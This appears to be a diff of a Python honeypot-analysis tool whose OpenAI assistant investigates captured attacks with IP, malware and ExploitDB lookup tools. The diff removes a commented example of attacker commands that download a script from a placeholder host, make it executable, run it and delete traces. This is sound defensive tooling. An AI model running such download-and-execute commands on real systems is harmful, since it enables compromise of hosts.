@@ -5,28 +5,12 @@ from osintanalyzers.ipanalyzer import IPAnalyzer
 from osintanalyzers.malwareanalyzer import MalwareAnalyzer
 
 
-class ToolCallLog:
-    """Class for storing tool calls to be used in a markdown file later
-    NOT IMPLEMENTED YET
-    """
 
-    def __init__(self, ass_id, thread_id, run_id, prompt=""):
-        self.ass_id = ass_id
-        self.thread_id = thread_id
-        self.run_id = run_id
-        self.prompt = prompt
+class RunStatusError(Exception):
+    """Run status is cancelled, failed, or expired"""
 
-        self.log = []
-
-    def add_tool_call(self, tool_call_id, tool_name, arguments, tool_output):
-        self.log.append({
-            "tool_call_id": tool_call_id,
-            "tool_name": tool_name,
-            "tool_args": arguments,
-            "tool_output": tool_output
-        })
-
-
+class RateLimitError(Exception):
+    """OpenAI API rate limit reached"""
 
 
 class OpenAIAssistantAnalyzer(OpenAIAnalyzerBase):
@@ -41,7 +25,6 @@ class OpenAIAssistantAnalyzer(OpenAIAnalyzerBase):
                  
                  ) -> None:
         super().__init__(training_data_dir, aidb_path, api_key, model)
-
         # Make dir to store data for assistants    
         self.ai_assistants_dir = self.training_data_dir / "assistants"
         if not self.ai_assistants_dir.exists():
@@ -54,20 +37,18 @@ class OpenAIAssistantAnalyzer(OpenAIAnalyzerBase):
         self.ai_messages = {}
         self.ai_runs = {}
 
-        # To store tool call logs (NOT IMPLEMENTED YET)
-        self.tool_call_logs = {}
-        self.current_tool_call_log = None
 
         # To handle tool calls (See _do_tool_call and tools.py)
         self.ipanalyzer = ipanalyzer
         self.malwareanalyzer = malwareanalyzer
 
     
+    
     def create_assistant(self, **kwargs):
         """Creates an assistant and stores it in ai_assistants dict and ai_assistants_dir/assistant_ids.txt"""
 
         assistant = self.client.beta.assistants.create(
-            model = kwargs.pop("model") or self.model,
+            model = kwargs.pop("model", self.model),
             **kwargs,
         )
         
@@ -171,25 +152,28 @@ class OpenAIAssistantAnalyzer(OpenAIAnalyzerBase):
             print(f"Status: {run.status} Thread id: {thread_id}, run_id: {run_id}")
 
             if run.status == "requires_action":
+                # Handles tool calls and submits tool outputs to run then recursively calls wait_for_response
                 return self.handle_submit_tool_outputs_required(run, attack, sleep_interval, **kwargs)
 
             elif run.status in ("cancelled", 'failed', 'expired'):
-                raise Exception(f"Run status: {run.status}")
+                raise RunStatusError(run.status, run.last_error)
             
             elif run.status == "completed":
+                print(f"Run {run.id} completed")
                 break
 
             else:
                 print(f"Waiting {sleep_interval} seconds for response")
                 sleep(sleep_interval)
         
+
         return self.client.beta.threads.messages.list(thread_id)
         
     
 
 
     def handle_submit_tool_outputs_required(self, run, attack, sleep_interval=5, **kwargs):
-        """Preforms tool calls and submits tool outputs to run."""
+        """Executes tool calls and submits tool outputs to run."""
 
         tool_outputs=[]
         for tool_call in run.required_action.submit_tool_outputs.tool_calls:
@@ -199,21 +183,24 @@ class OpenAIAssistantAnalyzer(OpenAIAnalyzerBase):
             print(f'\nAI called tool: {tool_name}\nwith args: {arguments}')
             # Get tool output with _do_tool_call
             tool_output = self._do_tool_call(tool_name, arguments, attack, **kwargs)
-            print(f'\nReturning tool output: {tool_output}')
-
+            
+            print(f'\nSubmitting tool output: {tool_output}')
+            
+            # Format tool output and add to tool_outputs list
             tool_outputs.append({
                 "tool_call_id": tool_call.id,
                 "output":  self.format_content(tool_output)
             })
 
-
+        
+        # Submit tool outputs to run and get updated run
         run = self.client.beta.threads.runs.submit_tool_outputs(
                 thread_id=run.thread_id,
                 run_id=run.id,
                 tool_outputs=tool_outputs
                 )
-        
 
+        # Recursively call wait_for_response to handle next required_action        
         return self.wait_for_response(run.thread_id, run.id, attack, sleep_interval, **kwargs)
     
 
@@ -265,9 +252,27 @@ class OpenAIAssistantAnalyzer(OpenAIAnalyzerBase):
         elif tool_name == "query_malpedia":
             # Uses MalwareAnalyzer to get Malpedia data for malware with malpedia_name
             tool_output = self.malwareanalyzer.get_reduced_data(
-                [arguments.get("malpedia_name", arguments).get("malware_name", "error"), ],
+                [arguments.get("malpedia_name", arguments.get("malware_name", "error")), ],
                 "malpedia_name",
                 ["malpedia"]
+            )
+
+        # Sets tool_output to ExploitDB search result for search_text
+        elif tool_name == "search_exploitdb":
+            # Uses MalwareAnalyzer to get ExploitDB results for search_text
+            tool_output = self.malwareanalyzer.get_reduced_data(
+                args=[arguments.get("search_text", arguments.get("text", "error")), ],
+                arg_type="search_text",
+                sources=["exploitdb"]
+            )
+
+        # Sets tool_output to ExploitDB exploit result for exploit_id
+        elif tool_name == "get_exploitdb_exploit":
+            # Uses MalwareAnalyzer to get ExploitDB exploit for exploit_id
+            tool_output = self.malwareanalyzer.get_reduced_data(
+                args=[arguments.get("exploit_id", arguments.get("id", "error")), ],
+                arg_type="exploitdb_id",
+                sources=["exploitdb"]
             )
 
 
@@ -277,14 +282,14 @@ class OpenAIAssistantAnalyzer(OpenAIAnalyzerBase):
 
 
     def run_with_assistant(self, 
-                           content, 
+                           *content, 
                            ass_id=None, 
                            thread_id=None, 
                            system_prompt=None, 
                            tools=[], 
-                           prepend_content=[], 
                            attack=None,
                            sleep_interval=5,
+                           run_status_error_retries=1,
                            **kwargs                   
                            ):
         
@@ -294,39 +299,58 @@ class OpenAIAssistantAnalyzer(OpenAIAnalyzerBase):
         ass = self.get_assistant(ass_id) if ass_id else self.create_assistant()
         thread = self.get_thread(thread_id) if thread_id else self.create_thread()
 
+
         # To determine if Assitant needs to be updated when system_prompt or tools have changed
         update_kwargs = {}
+
         # Check if system_prompt/instructions have changed
         if system_prompt != ass.instructions:
             update_kwargs.update({"instructions": system_prompt})
-        
-        # Check for different tool_names
-        if [tool["function"]["name"] for tool in tools] != [tool.function.name for tool in ass.tools]:
+            
+        # Check for different tool names in tools argument and Assitants current tools
+        if tools != [tool.model_dump() for tool in ass.tools]:
             update_kwargs.update({"tools": tools})
-        
-        # Update assitant if any update kwargs are present
+       
+        # Update Assitant if any update kwargs are present
         if update_kwargs:
-            ass = self.update_assistant(ass_id, **update_kwargs)
+            ass = self.update_assistant(ass.id, **update_kwargs)
+            print(f"Updated {ass.id}")
+        # content = kwargs.pop("content", content) # So content can be passed as positional or keyword arg
         
-        # Optionally prepend additional messages before content 
-        for precontent in prepend_content:
-            self.add_message_to_thread(precontent, thread.id)
+        # Add content to thread as message(s)
+        for message in content:
+            self.add_message_to_thread(message, thread.id)
 
-        # Add content to thread as message
-        self.add_message_to_thread(content, thread.id)
-
-        # Create a run
+        # Create a run using the updated Assistant and Thread  
         run = self.create_run(ass.id, thread.id, **kwargs)
-        # Wait for messages after handling tool_calls
-        messages = self.wait_for_response(thread.id, run.id, attack, sleep_interval, **kwargs)
 
 
-        print("done")
-        return ass, thread, run, messages 
+        # Wait for messages and recursively handle tool_calls until run is complete or RunStatusError occurs
+        try:
+            messages = self.wait_for_response(thread.id, run.id, attack, sleep_interval, **kwargs)
+            #tool_call_log = self.tool_call_logs[self.current_tool_call_log_key]
+            
+            print(f"Done {ass.id}, {thread.id}, {run.id}")
+            return ass, thread, run, messages 
+        
+        except RunStatusError as e:
+            print(e)
+            
+            if run_status_error_retries > 0:
+                print(f"Retrying {run_status_error_retries} more time(s)")
+                
+                return self.run_with_assistant(content, ass_id, thread_id, system_prompt,
+                                               tools, attack, sleep_interval,
+                                               run_status_error_retries - 1, # Decrement retries 
+                                               **kwargs)
+            
+            else:
+                raise e # Raise the RunStatusError if no more retries 
+
+        
 
 
-
-    def ass_answer_questions(self, questions, attack: Attack):
+    def ass_answer_questions(self, questions, attack: Attack, code_interpreter=True):
         
         system_prompt = ''.join([
         "Your role is to answer questions about an attack on a Linux honeypot. "
@@ -335,18 +359,28 @@ class OpenAIAssistantAnalyzer(OpenAIAnalyzerBase):
         "threatfeed reports and previous reports of known malware associated with the IP(s). "
         "Your answers will be used in a GitHub .md file so you should use markdown syntax to format your output. "
         "Use the available functions to request relevant information to thoroughly answer each question. "
+        "You should use multiple tool calls to analyze the data returned by previous tool calls "
+        "and to get any additional data you need to answer accurately. "
         "For example if you see that the attacker downloaded malware in the commands, "
         "you should use the get_attack_attrs function with the arguement 'uniq_malware' to get a list of malware_ids associated with the attack, "
         "then use get_malware_attrs and the query_ functions analyze the malware."
-        "When getting attrs, always use the uniq_ modifier first when available to get unique values and only get all values if necessary after analyzing the unique values. "
+        "When getting attrs, always use the uniq_ modifier first when available to get unique values "
+        "and only get all values if necessary after analyzing the unique values. "
         ])
-        
+
 
         # Function schemas for Assistant tool_calls. See tools.py
-        tools = TOOLS
+        tools = list(TOOLS)
 
-        # To store {question: answer...}
-        question_answers = {}
+        # Add code_interpreter tool if code_interpreter is True
+        if code_interpreter:
+            tools.append({"type": "code_interpreter"})
+            system_prompt += ''.join([
+            "Use the code_interpreter tool to enhance your analysis. ",
+            "For example if you find an encoded string in the http requests, commands, or malware, "
+            "you should use the code_interpreter tool to decode it then analyze the decoded result in context. "
+            ])
+
 
         #TODO dynamically load assitant and thread ids for Attacks
         ass_id = "asst_R5O9vhLKONwNlqmmxbMYugLo"
@@ -356,51 +390,81 @@ class OpenAIAssistantAnalyzer(OpenAIAnalyzerBase):
         attack_questions_dir = self.ai_assistants_dir / attack.attack_id
         attack_questions_dir.mkdir(exist_ok=True)
 
-        # Get answer for each question
+        # To store {question: answer...}
+        question_answers = {}
+        
+        # Iter through questions and get answer for each question
         for question in questions:
 
-            # Filename for answer is hash of question concat with attack_id
-            attack_qa_hash = sha256hex(question + attack.attack_id)
-            question_answer_file = attack_questions_dir / attack_qa_hash
+            # Filename for saving answer is hash of question concat with attack_id
+            question_answer_file = attack_questions_dir / (sha256hex(question + attack.attack_id) + '.json')
             
-            # Prevent calling same question on an attack if answer file exists
+
+            # Use stored answer if answer file exists
             if question_answer_file.exists():
                 with question_answer_file.open("r") as f:
                     question_answer = json.load(f)
                     question_answers.update(question_answer)
-                    continue
+                
+                continue # Prevent wasting tokens by asking question again
 
             
             print(f"\n\nAsking: {question}")
             
             # Run with assistant with question as content
             ass, thread, run, messages = self.run_with_assistant(
-                content=question,
+                question,
                 ass_id=ass_id,
                 thread_id=thread_id,
                 system_prompt=system_prompt,
                 tools=tools,
-                #prepend_content=prepend_content,
                 attack=attack,
                 )
             
             # Assign values if Assitant or thread was newly created
             ass_id = ass.id
-            thread_id = thread.id            
-            
+            thread_id = thread.id
+            run_id = run.id
+
             # Answer is latest message in Thread
             answer = messages.data[0].content[0].text.value
 
             # Add answers to dict of {question: answer}
             question_answers[question] = answer
             
-            # Store for later
+            # Retreive run steps in ascending order            
+            run_steps = self.client.beta.threads.runs.steps.list(
+                run_id=run_id,
+                thread_id=thread_id,
+                limit=100,
+                order="asc"
+                )
+            
+            # 
+            run_log = {
+                "content": question,
+                "system_prompt": system_prompt,
+                "ass_id": ass_id,
+                "thread_id": thread_id,
+                "run_id": run_id,
+                "run_steps": run_steps.model_dump(),
+                "answer": answer
+            }
+            
+            # Dump question:answer pair and ToolCallLog as JSON to read later
             with question_answer_file.open("w+") as f:
                 json.dump({question: answer}, f)
+            
+            # Dump run steps to file
+            run_log_file = question_answer_file.with_name(question_answer_file.name + "-run-steps")
+            with run_log_file.open("w+") as f:
+                json.dump(run_log, f)
+
 
             print(f"\n Done with: {question}\nAnswer: {answer}")
 
         return question_answers
+        
 
 
 
@@ -420,20 +484,6 @@ class OpenAIAssistantAnalyzer(OpenAIAnalyzerBase):
 
 
 
-
-if __name__ == "__main__":
-
-    pass
-    # example_commands1 = ["wget http://example.com -O /usr/bin/example.sh", 
-    #                          "cd /usr/bin;chmod +x example.sh", 
-    #                          "./example.sh >> example_output.py", 
-    #                          "exec example_output.py || python3 example_output.py &",
-    #                          "ps -ajfx | grep example_output.py", 
-    #                          "rm example.sh",  "rm example_output.py", "exit"]
-    
-
-    # ass_analyzer = OpenAIAssistantAnalyzer()
-    
 
 
 
